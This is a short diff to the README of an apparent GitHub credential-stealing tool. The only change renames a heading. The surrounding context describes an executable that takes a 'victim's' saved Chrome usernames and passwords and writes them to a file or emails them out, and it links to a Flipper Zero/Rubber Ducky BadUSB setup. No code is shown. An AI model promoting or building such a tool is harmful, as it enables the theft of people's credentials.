@@ -22,7 +22,7 @@
 
 [Flipper zero/Rubber Ducky](https://github.com/Krook9d/Chrome-password-exfiltrator/blob/main/README.md#flipper-zero-bad-usb-configuration)
 
-# About The Project
+# About
 
 This is a Chrome Passwords grabber. When your victim clicks on the .exe, their chrome passwords and usernames are written on a file or sent by email.
 
